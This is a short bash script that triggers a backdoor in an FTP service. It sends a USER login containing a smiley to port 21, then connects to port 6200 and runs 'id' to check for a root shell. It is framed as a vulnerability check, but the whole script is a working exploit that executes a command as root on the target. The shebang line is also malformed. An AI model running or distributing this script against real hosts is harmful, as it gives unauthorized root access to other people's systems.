#!/bin/bash/

if [ -z $1 ]

then

echo "usage: ./$0 target_ip"

exit 0

fi

echo "Connection to target $1"

{ echo "USER user:)"; echo "PASS pass"; sleep 1; } | telnet $1 21 1> 1 2> 2

RES=`cat 2 | grep "refused" | wc -l`

if [ $RES -eq 0 ]; then

echo "Send message FTP OK"

else

echo "FTP is refused. Check connect and try"

exit 0

fi

{ echo "id;"; sleep 1; } | telnet $1 6200 1> 1 2> 2

RES=`cat 1 | grep "uid=0" | wc -l`

if [ $RES -eq 1 ]; then

echo "Tagret is vulnerable"

else

echo "Target is not vulnerable"

fi
